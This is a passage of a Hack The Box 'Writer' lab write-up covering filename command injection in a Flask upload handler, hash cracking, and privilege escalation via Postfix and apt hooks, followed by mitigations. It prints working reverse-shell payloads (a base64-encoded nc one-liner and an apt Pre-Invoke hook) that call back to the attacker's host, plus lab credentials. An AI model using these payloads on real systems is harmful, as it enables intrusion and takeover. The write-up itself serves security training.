&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;result = connector.commit()<br><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;except PIL.UnidentifiedImageError:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c2 c43">os.</span><span class="c18 c43">system</span><span class="c2 c43">(&quot;rm {}&quot;.format(image))</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;error = </span><span class="c2 c12">&quot;Not a valid image file!&quot;</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">return</span><span class="c2">&nbsp;render_template(</span><span class="c2 c12">&#39;edit.html&#39;</span><span class="c2">, error=error, results=results, id=id)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;excep</span><span class="c2 c46">t:</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;error = </span><span class="c2 c12">&quot;Issue uploading picture&quot;</span><span class="c2"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">return</span><span class="c2">&nbsp;render_template(</span><span class="c2 c12">&#39;edit.html&#39;</span><span class="c2">, error=error, results=results, id=id)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">else</span><span class="c2">:<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;error = </span><span class="c2 c12">&quot;File extensions must be in .jpg!&quot;</span></p></td></tr></table><p class="c10"><span class="c35 c45">Note the file was shortened to better emphasize the source code of the upload feature. Critically insecure code is highlighted in red, and the text highlighted in purple is the segment that the undermentioned exploit focuses on.</span></p><h3 class="c15" id="h.eswqky3qu6hx"><span>Finding RCE Vulnerability</span></h3><p class="c10"><span>Within the source code are multiple examples of insecure code (explored more in detail in the </span><span class="c29"><a class="c3" href="#h.ui1gvqou6arf">Post Exploitation Analysis</a></span><span class="c37">&nbsp;</span><span>section). One that particularly stands out is the call of </span><span class="c16">os.system</span><span class="c7">&nbsp;on the uploaded filename. Before testing exploits on the target, the exploit was tested out locally to get a closer view as to how the program behaves. Copying the segment of interest, we can get a closer look at how the program treats file names:</span></p><p class="c5"><span class="c7"></span></p><p class="c8 c26"><span class="c36">Code</span><span class="c7">&nbsp;</span></p><a id="t.6416c7a7c03762558d5c0764d340662aa130ab45"></a><a id="t.9"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">import urllib<br>import os<br>from flask import request<br><br>local_filename, headers = urllib</span><span class="c11">.request.urlretrieve</span><span class="c2">(</span><span class="c2 c12">&#39;http://10.10.15.80/.jpg/1.jpg;sleep&#39;</span><span class="c2">)<br></span><span class="c2 c46">print</span><span class="c2">(</span><span class="c2 c12">&quot;The local_filename is&quot;</span><span class="c2">, local_filename)<br>os.system(</span><span class="c2 c12">&quot;mv {} {}.jpg&quot;</span><span class="c2">.format(local_filename, local_filename))</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span>Observe the argument of the </span><span class="c16">urllib.request.urlretrieve()</span><span>&nbsp;function. The user is in control of this argument. If a user were to upload a file called </span><span class="c16">1.jpg;sleep</span><span class="c7">, then the server will behave accordingly:</span></p><p class="c8 c26"><span class="c36"><br>Response</span></p><a id="t.8b35e027d7da98e99187453f0f526823e0dc24a6"></a><a id="t.10"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">The local_filename </span><span class="c11">is</span><span class="c2">&nbsp;/tmp/tmpen3ya1q1</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span>However, when changing the argument to be </span><span class="c16">file:///home/0xd4y/business/hackthebox/medium/linux/writer/www/.jpg/1.jpg;sleep 10</span><span>, then command execution is performed. This works because the urllib function does not correctly rename the file to something safe in the instance that the argument is using the file protocol. Therefore, a file with a malicious name can be uploaded using the </span><span class="c16">image</span><span class="c7">&nbsp;parameter, and this file can then be referenced locally via the file protocol.</span></p><h3 class="c15" id="h.y2evuj3gcvwr"><span class="c32">Reverse Shell</span></h3><p class="c10"><span>After uploading a file with the name </span><span class="c16">`0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`</span><span>, it was referenced locally by putting the following in the image_url parameter: </span><span class="c16">file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`</span><span>. A reverse shell was then returned as the www-data user:</span></p><a id="t.84f8cff71a68a63f9b146f250463c85016f82063"></a><a id="t.11"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">&#9484;&#9472;</span><span class="c2 c12">[&#10007;]</span><span class="c2">&#9472;</span><span class="c2 c12">[0xd4y@Writeup]</span><span class="c2">&#9472;</span><span class="c2 c12">[~/business/hackthebox/medium/linux/writer]</span><span class="c2"><br>&#9492;&#9472;&#9472;&#9596; $nc -lvnp 9001<br>listening on </span><span class="c2 c12">[any]</span><span class="c2">&nbsp;9001 ...<br>connect to </span><span class="c2 c12">[10.10.15.80]</span><span class="c2">&nbsp;from (UNKNOWN) </span><span class="c2 c12">[10.10.11.101]</span><span class="c2">&nbsp;59938<br>/bin/sh: 0: can&#39;t access tty; job control turned off<br>$ whoami<br>www-data</span></p></td></tr></table><h2 class="c15" id="h.liuipufirkbp"><span class="c4">Privilege Escalation</span></h2><h3 class="c15" id="h.hx02jbakg0r0"><span class="c32">Kyle</span></h3><p class="c10"><span>After enumerating multiple files in the box, it was found that there is a username and password in a mysql config file called </span><span class="c16">/etc/mysql/my.cnf</span><span>&nbsp;that points to the </span><span class="c16">dev</span><span class="c7">&nbsp;database:</span></p><a id="t.b54202f7d0863a29a9f4f7751290f2b788657bd2"></a><a id="t.12"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">database = dev</span><span class="c11"><br>user </span><span class="c2">= djangouser<br>password = DjangoSuperPassword</span></p></td></tr></table><p class="c1 c51"><span class="c7"></span></p><p class="c10"><span class="c7">One of Kyle&rsquo;s passwords is located in the databases, albeit it is hashed:</span></p><p class="c10"><span class="c16">pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=</span><span>. Cracking this hash reveals that Kyle&rsquo;s password is </span><span class="c16">marcoantonio</span><span class="c7">.</span></p><h3 class="c15" id="h.jq4agn4fei2y"><span class="c32">John</span></h3><p class="c10"><span>The kyle user is part of multiple groups, one of them being the </span><span class="c16">filter</span><span>&nbsp;group which has permissions to edit the </span><span class="c16">/etc/postfix/disclaimer</span><span class="c7">&nbsp;file. Furthermore, after enumerating the ports running locally on the target, it was found that port 25 is open and running a Postfix SMTP server.</span></p><p class="c5"><span class="c7"></span></p><p class="c10"><span>With pspy</span><sup><a href="#ftnt2" id="ftnt_ref2">[2]</a></sup><span class="c7">&nbsp;running on a separate kyle SSH instance, the following message was sent on the box:</span></p><a id="t.e14ec1153ee825db60a20617212b89508caf87a9"></a><a id="t.13"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">kyle</span><span class="c18 c6">@writer</span><span class="c2">:~$ nc localhost 25<br>220 writer.htb ESMTP Postfix (Ubuntu)<br>MAIL </span><span class="c2 c12">FROM:</span><span class="c2">kyle</span><span class="c18 c6">@writer</span><span class="c2">.htb<br>250 2.1.0 Ok<br>RCPT </span><span class="c2 c12">TO:</span><span class="c2">&nbsp;john</span><span class="c18 c6">@writer</span><span class="c2">.htb<br>250 2.1.5 Ok<br>Data<br>354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br>Thanks </span><span class="c11">for</span><span class="c2">&nbsp;reading </span><span class="c11">this</span><span class="c2">&nbsp;writeup!<br>.<br>250 2.0.0 </span><span class="c2 c12">Ok:</span><span class="c2">&nbsp;queued </span><span class="c11">as</span><span class="c2">&nbsp;9BB6F137</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span class="c7">Upon sending this message, the following process occurred in the background:</span></p><a id="t.135cfe218515359e13977e0659ea86b7375e723d"></a><a id="t.14"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">2021</span><span class="c2 c20">/08/</span><span class="c2">25 00:12:54 </span><span class="c2 c12">CMD:</span><span class="c2">&nbsp;UID=1001 PID=23607 &nbsp;| </span><span class="c2 c20">/bin/</span><span class="c2">sh </span><span class="c2 c20">/etc/</span><span class="c2">postfix/disclaimer -f kyle</span><span class="c18 c6">@writer</span><span class="c2">.htb -- john</span><span class="c18 c6">@writer</span><span class="c2">.htb</span></p></td></tr></table><p class="c1 c51"><span class="c7"></span></p><p class="c1"><span>Thus, the server is running as the john user (note </span><span class="c16">UID=1001</span><span>), and is executing the </span><span class="c16">/etc/postfix/disclaimer</span><span class="c7">&nbsp;file. Seeing as the kyle user had permission to edit this file, achieving a reverse shell as the john user could be obtained via appending a reverse shell to the top of the file and sending a message:</span></p><a id="t.ff0c723efd94e4c23a89d86d96bfa003d25b4dee"></a><a id="t.15"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">&#9484;&#9472;</span><span class="c2 c12">[0xd4y@Writeup]</span><span class="c2">&#9472;</span><span class="c2 c12">[~/business/hackthebox/medium/linux/writer]</span><span class="c2"><br>&#9492;&#9472;&#9472;&#9596; $nc -lvnp 9001<br>listening on </span><span class="c2 c12">[any]</span><span class="c2">&nbsp;9001 ...<br>connect to </span><span class="c2 c12">[10.10.15.80]</span><span class="c2">&nbsp;from (UNKNOWN) </span><span class="c2 c12">[10.10.11.101]</span><span class="c2">&nbsp;49840<br>/bin/sh: 0: can&#39;t access tty; job control turned off<br>$ whoami<br>john</span></p></td></tr></table><p class="c1 c51"><span class="c7"></span></p><p class="c1"><span class="c7">Persistence on this account was maintained by grabbing john&rsquo;s ssh key.</span></p><h3 class="c38" id="h.etqhj0aul7pm"><span class="c32">Root</span></h3><p class="c10"><span>John is part of the management group which has permission to edit the apt directory </span><span class="c16">/etc/apt/apt.conf.d</span><span>, a directory which is responsible for containing the apt configurations. As discovered using pspy, there is a cronjob running as root which performs the following command: </span><span class="c16">/usr/bin/apt-get update</span><span class="c7">. Therefore, a malicious configuration that returns a reverse shell can be added to the directory as follows:</span></p><a id="t.39604f8bd9daf73e7949f286ffb0c3b7c1422cee"></a><a id="t.16"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">john</span><span class="c2 c46">@writer</span><span class="c2 c6">:~</span><span class="c2 c46">$ </span><span class="c2">echo </span><span class="c2 c12">&#39;apt::Update::Pre-Invoke {&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.80 9001 &gt;/tmp/f&quot;};&#39;</span><span class="c2">&nbsp;&gt; </span><span class="c2 c20">/etc/apt/apt.conf.d/</span><span class="c2">0xd4y-pwn</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span class="c7">When the cronjob runs again, a reverse shell is returned as the root user:</span></p><a id="t.1f2a8cd8d05d23258b3af1531c9e21f81dc15ed7"></a><a id="t.17"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">&#9484;&#9472;</span><span class="c2 c12">[&#10007;]</span><span class="c2">&#9472;</span><span class="c2 c12">[0xd4y@Writeup]</span><span class="c2">&#9472;</span><span class="c2 c12">[~/business/hackthebox/medium/linux/writer]</span><span class="c2"><br>&#9492;&#9472;&#9472;&#9596; $nc -lvnp 9001<br>listening on </span><span class="c2 c12">[any]</span><span class="c2">&nbsp;9001 ...<br>connect to </span><span class="c2 c12">[10.10.15.80]</span><span class="c2">&nbsp;from (UNKNOWN) </span><span class="c2 c12">[10.10.11.101]</span><span class="c2">&nbsp;56068<br>/bin/sh: 0: can&#39;t access tty; job control turned off<br># whoami <br>root</span></p></td></tr></table><h1 class="c15 c22" id="h.px1q03fgnzid"><span class="c25 c14"></span></h1><h1 class="c15 c22" id="h.4sbgi3bzc0y5"><span class="c25 c14"></span></h1><h1 class="c15 c22" id="h.u7jqjyvxapok"><span class="c25 c14"></span></h1><h1 class="c15 c22" id="h.qilduljwluqr"><span class="c25 c14"></span></h1><h1 class="c15 c22" id="h.pnrkqnc9twt0"><span class="c25 c14"></span></h1><h1 class="c15 c22" id="h.sn6qi7wpxijj"><span class="c25 c14"></span></h1><h1 class="c15 c22" id="h.xstwjeb8kek0"><span class="c25 c14"></span></h1><h1 class="c15 c22" id="h.3tyi7tnwcc6e"><span class="c14 c25"></span></h1><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><h1 class="c15" id="h.ui1gvqou6arf"><span class="c25 c14">Post Exploitation Analysis</span></h1><hr><p class="c5"><span class="c7"></span></p><p class="c10"><span class="c7">This section goes into further detail about the vulnerabilities of the target and how to mitigate them. Note that the mitigations shown in this section are incomplete pieces of code, however they are secure implementations of the desired result.</span></p><h2 class="c15" id="h.nw8pksu8e5re"><span class="c4">SQLi Mitigation (PDO)</span></h2><p class="c10"><span>This machine contained multiple vulnerabilities, starting with the SQL injection in the </span><span class="c16">/administrative</span><span class="c7">&nbsp;page. The vulnerability lies in the following SQL statement that is performed on the user&rsquo;s query:</span></p><a id="t.e64d913b274d69711079b62ac537265340a8193c"></a><a id="t.18"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">&quot;</span><span class="c11">Select</span><span class="c2">&nbsp;* </span><span class="c11">From</span><span class="c2">&nbsp;</span><span class="c11">users</span><span class="c2">&nbsp;</span><span class="c11">Where</span><span class="c2">&nbsp;username = </span><span class="c2 c12">&#39;%s&#39;</span><span class="c2">&nbsp;</span><span class="c11">And</span><span class="c2">&nbsp;</span><span class="c11">password</span><span class="c2">&nbsp;= </span><span class="c2 c12">&#39;%s&#39;&quot; % (username, password)</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span class="c7">This insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing. To mitigate SQL injection attacks, the current recommendation is to use PDO (PHP Data Objects). The following code does not directly pass the user input into the SQL statement. Rather, using PDO tells the server what the SQL query and the user-inputted data are. This is successfully performed because the instruction and user-input are sent separately to the database:</span></p><a id="t.dcb247b41988037fbed2b0cd09c62030a01cc810"></a><a id="t.19"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c18 c6">&lt;?php</span><span class="c2"><br><br></span><span class="c11">try</span><span class="c2">&nbsp;{<br><br> &nbsp;$conn = </span><span class="c11">new</span><span class="c2">&nbsp;PDO(</span><span class="c2 c12">&quot;mysql:host=$servername;dbname=$dbname&quot;</span><span class="c2">, $db_username, $db_password);<br><br> &nbsp;</span><span class="c2 c20">// set the PDO error mode to exception</span><span class="c2"><br> &nbsp;$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);<br><br> &nbsp;</span><span class="c2 c20">// prepare sql and bind parameters</span><span class="c2"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$query = </span><span class="c2 c12">&quot;INSERT INTO users (username,password) &nbsp;VALUES(:username,:password)&quot;</span><span class="c2">;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$statement = $conn-&gt;prepare($query);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$statement-&gt;execute(</span><span class="c11">array</span><span class="c2">(<br> &nbsp; &nbsp;</span><span class="c2 c12">&#39;:username&#39;</span><span class="c2">=&gt; $username,<br> &nbsp; &nbsp;</span><span class="c2 c12">&#39;:password&#39;</span><span class="c2">=&gt; $password<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;));<br><br>} </span><span class="c11">catch</span><span class="c2">(PDOException $e) {<br> &nbsp;</span><span class="c11">echo</span><span class="c2">&nbsp;</span><span class="c2 c12">&quot;Error: &quot;</span><span class="c2">&nbsp;. $e-&gt;getMessage();<br>}<br>$conn = </span><span class="c11">null</span><span class="c2">;<br><br></span><span class="c18 c6">?&gt;</span></p></td></tr></table><h2 class="c15" id="h.4o6awot3ot4"><span class="c4">Image Upload (RCE)</span></h2><p class="c10"><span>After successfully performing an SQL injection attack, an upload feature in the webpage was exploited to gain RCE due to insecure python code. System commands and evaluation functions should never be performed on user input. As discussed in </span><span class="c29"><a class="c3" href="#h.eswqky3qu6hx">Finding RCE Vulnerability</a></span><span>, the </span><span class="c16">system()</span><span class="c7">&nbsp;function in the os module was the reason for the critical RCE vulnerability. The following code prevents this vulnerability:</span></p><a id="t.2811219fd225b98f84c800154f233db15aa2ce6a"></a><a id="t.20"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">from werkzeug.utils </span><span class="c11">import</span><span class="c25 c2 c54">&nbsp;secure_filename</span></p><p class="c1"><span class="c2">from PIL </span><span class="c11">import</span><span class="c2">&nbsp;Image<br><br>filename = request.file(</span><span class="c2 c12">&#39;image&#39;</span><span class="c2">)<br><br></span><span class="c11">image</span><span class="c2">&nbsp;= StringIO(base64.b64decode(download[</span><span class="c2 c12">&#39;file&#39;</span><span class="c2">]))<br>allowed_extensions = [</span><span class="c2 c12">&#39;jpg&#39;</span><span class="c2">,</span><span class="c2 c12">&#39;jpeg&#39;</span><span class="c2">]<br></span><span class="c11">if</span><span class="c2">&nbsp;filename.</span><span class="c11">split</span><span class="c2">(</span><span class="c2 c12">&#39;.&#39;</span><span class="c2">)[-1] in allowed_extensions:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c11">try</span><span class="c2">:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filename = secure_filename(filename)<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;img = Image.</span><span class="c11">open</span><span class="c2">(</span><span class="c11">image</span><span class="c2">)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;img.verify()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path = os.path.</span><span class="c11">join</span><span class="c2">(</span><span class="c2 c12">&#39;/var/www/writer.htb/writer/static/img/&#39;</span><span class="c2">, filename)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c11">image</span><span class="c2">.</span><span class="c11">save</span><span class="c2">(path)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except Exception:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c11">print</span><span class="c2">(</span><span class="c2 c12">&#39;Invalid image&#39;</span><span class="c2">)<br></span><span class="c11">else</span><span class="c2">:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c11">print</span><span class="c2">(</span><span class="c2 c12">&#39;Filename extension not allowed.&#39;</span><span class="c2">)</span></p></td></tr></table><p class="c1 c51"><span class="c7"></span></p><p class="c10"><span>The above program verifies if a file is a valid image by first checking its extension. Note that this is different from the source code of the website which simply searches for the presence of the </span><span class="c16">.jpg</span><span>&nbsp;string in the filename. After verifying the file&rsquo;s extension, PIL&rsquo;s verify method is called on the file before the file is uploaded to the </span><span class="c16">img</span><span class="c7">&nbsp;directory.</span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><h1 class="c15" id="h.m32hn92j9nqq"><span class="c25 c14">Conclusion</span></h1><hr><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c10"><span>Multiple vulnerabilities were present on the target which resulted in a full compromise of the system. The </span><span class="c16">/administrative</span><span class="c7">&nbsp;page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass. After authenticating to the server, the insecure handling of filenames led to an RCE vulnerability.</span></p><p class="c5"><span class="c7"></span></p><p class="c10"><span>Afterwards, the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service. Due to the service running under john, the lateral movement involved adding a reverse shell to the configuration of the service. As the john user, apt configurations could be modified to exploit an </span><span class="c16">apt-get update</span><span class="c7">&nbsp;cronjob running as the root user. Observe the following remediations to mitigate the vulnerabilities outlined in the report:</span></p><p class="c5"><span class="c7"></span></p><ul class="c24 lst-kix_v0qn4kceff8o-0 start"><li class="c10 c53 li-bullet-0"><span>Secure the SQL login page on </span><span class="c16">/administrative</span></li></ul><ul class="c24 lst-kix_v0qn4kceff8o-1 start"><li class="c10 c21 li-bullet-0"><span>PDO should be used in place of the insecure SQL statement (see </span><span class="c29"><a class="c3" href="#h.nw8pksu8e5re">SQLi Mitigation (PDO)</a></span><span class="c7">).</span></li></ul><ul class="c24 lst-kix_v0qn4kceff8o-0"><li class="c10 c53 li-bullet-0"><span>Never use </span><span class="c16">system()</span><span class="c7">&nbsp;or any sort of evaluation function on user-input.</span></li></ul><ul class="c24 lst-kix_v0qn4kceff8o-1 start"><li class="c10 c21 li-bullet-0"><span class="c7">The system command on the uploaded filename resulted in RCE.</span></li></ul><ul class="c24 lst-kix_v0qn4kceff8o-0"><li class="c10 c53 li-bullet-0"><span class="c7">Never reuse passwords</span></li></ul><ul class="c24 lst-kix_v0qn4kceff8o-1 start"><li class="c10 c21 li-bullet-0"><span>As the www-data user, kyle&rsquo;s password could be retrieved by cracking his hash from the </span><span class="c16">dev</span><span class="c7">&nbsp;database. This would not have been of much use if the local kyle user had a different password on the target.</span></li><li class="c10 c21 li-bullet-0"><span class="c7">Passwords should be secure.</span></li></ul><ul class="c24 lst-kix_v0qn4kceff8o-0"><li class="c10 c53 li-bullet-0"><span class="c7">Fix misconfigurations related to the kyle and john user</span></li></ul><ul class="c24 lst-kix_v0qn4kceff8o-1 start"><li class="c10 c21 li-bullet-0"><span class="c7">kyle was able to edit a service that was run by john. To mitigate this, the service should either be run by kyle, or kyle should not have permissions to edit the service.</span></li><li class="c10 c21 li-bullet-0"><span>john was able to edit apt configurations. This sort of privilege should not be granted to any user. By adding a reverse shell to the apt configurations, any user who runs the apt command can be compromised by john.</span></li></ul><div><p class="c26 c41"><span class="c25 c36 c35"></span></p></div><hr class="c52"><div><p class="c26 c56"><a href="#ftnt_ref1" id="ftnt1">[1]</a><span class="c35">&nbsp;</span><span class="c29 c35"><a class="c3" href="https://www.google.com/url?q=https://github.com/OJ/gobuster&amp;sa=D&amp;source=editors&amp;ust=1653890599954217&amp;usg=AOvVaw2kKjQ64_eHIzeyhFcZ5DFr">https://github.com/OJ/gobuster</a></span><span class="c25 c35 c39">&nbsp;</span></p></div><div><p class="c56 c26"><a href="#ftnt_ref2" id="ftnt2">[2]</a><span class="c35">&nbsp;</span><span class="c29 c35"><a class="c3" href="https://www.google.com/url?q=https://github.com/DominicBreuker/pspy&amp;sa=D&amp;source=editors&amp;ust=1653890599954706&amp;usg=AOvVaw1myDlXZ3sl8HFOVWQGkNpr">https://github.com/DominicBreuker/pspy</a></span><span class="c25 c39 c35">&nbsp;</span></p></div></body></html>